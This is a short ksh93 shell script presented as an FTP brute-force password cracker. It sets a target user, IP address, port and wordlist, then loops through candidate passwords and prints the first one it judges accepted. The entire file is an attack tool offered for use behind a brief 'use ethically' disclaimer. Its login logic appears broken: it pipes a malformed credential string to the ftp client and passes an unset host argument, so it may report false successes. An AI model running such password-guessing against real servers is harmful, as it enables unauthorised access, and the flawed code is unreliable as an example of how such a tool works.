#!/usr/bin/ksh93
################################################################

################################################################
#### A simple ftp brute force script.
#### PLEASE use ethically.
#### I take NO responsibility for your actions!
################################################################

################################################################
#### Set Debug Mode
# set -x

################################################################
#### Set user IP port if not defualt and wordlist.txt

ftp_user=test
ftp_server_ip=192.168.117.116
ftp_port=21
wordlist=/home/$USER/wordlist.txt

################################################################
#### Display Message
function displaymsg {
  print "
Program: ftp_crack.ksh
Date: 05/12/2025
Author: William Butler coldboot@yahoo.com
License: GNU GPL (version 3, or any later version).
"
}

################################################################
#### run loop

cat $wordlist | while read -r password
do
	status=$(echo "$ftp_user:$password@$ftp_server_ip:$ftp_port" | /usr/bin/ftp -n "$1")
	if [[ $status  != *"Login failed"* ]]; then 
		echo "$ftp_user Password is $password" 
	     	break
	fi
	
done
